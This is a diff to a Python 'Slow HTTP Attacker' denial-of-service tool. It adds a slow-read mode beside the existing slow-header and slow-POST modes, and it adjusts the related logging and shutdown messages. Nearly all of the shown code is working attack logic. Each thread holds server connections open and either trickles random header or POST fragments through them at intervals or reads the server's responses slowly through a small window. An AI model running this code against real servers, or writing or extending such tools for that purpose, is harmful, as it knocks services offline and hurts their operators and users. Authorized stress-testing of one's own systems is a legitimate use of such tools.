@@ -95,20 +95,30 @@ class Attacker:
                 break
 
             try:
-                while True:
-                    with self.lock:
-                        if self.is_stopped:
-                            s.close()
-                            self.thread_cnt -= 1
-                            sys.exit(0)
-                    logging.debug("Sending a beat...")
-                    if self.mode == Mode.HEADER:
-                        send_header(s, "X-a", random.randint(1, 5000))
-                    elif self.mode == Mode.POST:
-                        send_utf8(s, ''.join(random.choices(string.ascii_letters, k=7)) + '=' + ''.join(
-                            random.choices(string.ascii_letters, k=3)) + '&')
-                    logging.debug("Sleeping for %d seconds", self.sleeptime)
-                    time.sleep(self.sleeptime)
+                if self.mode == Mode.HEADER or self.mode == Mode.POST:
+                    while True:
+                        with self.lock:
+                            if self.is_stopped:
+                                s.close()
+                                self.thread_cnt -= 1
+                                sys.exit(0)
+                        logging.debug("Sending a beat...")
+                        if self.mode == Mode.HEADER:
+                            send_header(s, "X-a", random.randint(1, 5000))
+                        elif self.mode == Mode.POST:
+                            send_utf8(s, ''.join(random.choices(string.ascii_letters, k=7)) + '=' + ''.join(
+                                random.choices(string.ascii_letters, k=3)) + '&')
+                        logging.debug("Sleeping for %d seconds", self.sleeptime)
+                        time.sleep(self.sleeptime)
+
+                elif self.mode == Mode.READ:
+                    while True:
+                        with self.lock:
+                            if self.is_stopped:
+                                s.close()
+                                self.thread_cnt -= 1
+                                sys.exit(0)
+                        logging.debug('receive: ' + s.recv(self.window).decode())
             except socket.error:
                 logging.debug('The connection is closed. Gonna recreate.')
                 continue
@@ -125,7 +135,8 @@ class Attacker:
             logging.info('port: %d' % self.port)
             logging.info('path: %s' % self.path)
             logging.info('HTTPS: %s' % self.https.__str__())
-            logging.info('sleeptime: %d' % self.sleeptime)
+            if self.mode == Mode.POST or self.mode == Mode.HEADER:
+                logging.info('sleeptime: %d' % self.sleeptime)
             logging.info('randuseragent: %s' % self.randuseragent.__str__())
             if self.mode == Mode.READ:
                 logging.info('window: %d' % self.window)
@@ -144,5 +155,8 @@ class Attacker:
             with self.lock:
                 self.is_stopped = True
             print()
-            logging.info('Stopping Slow HTTP Attacker. Please wait at most %d seconds...' % self.sleeptime)
+            if self.mode == Mode.HEADER or self.mode == Mode.POST:
+                logging.info('Stopping Slow HTTP Attacker. Please wait at most %d seconds...' % self.sleeptime)
+            elif self.mode == Mode.READ:
+                logging.info('Stopping Slow HTTP Attacker...')
             sys.exit(0)
